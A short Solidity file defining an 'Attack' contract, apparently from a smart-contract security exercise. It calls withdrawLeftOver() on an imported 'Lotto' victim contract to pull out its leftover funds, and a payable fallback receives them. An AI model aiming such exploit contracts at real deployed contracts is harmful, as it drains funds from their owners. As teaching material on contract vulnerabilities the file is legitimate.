pragma solidity ^0.6.7;
import "./victim.sol";

contract Attack{
    Lotto LottoContract;

    fallback () external payable
    {

    } 
    constructor(address payable _victimAddress) payable public {
        LottoContract = Lotto(_victimAddress);
    }
    function AttackVictim() payable public
    {
        LottoContract.withdrawLeftOver();
    }

}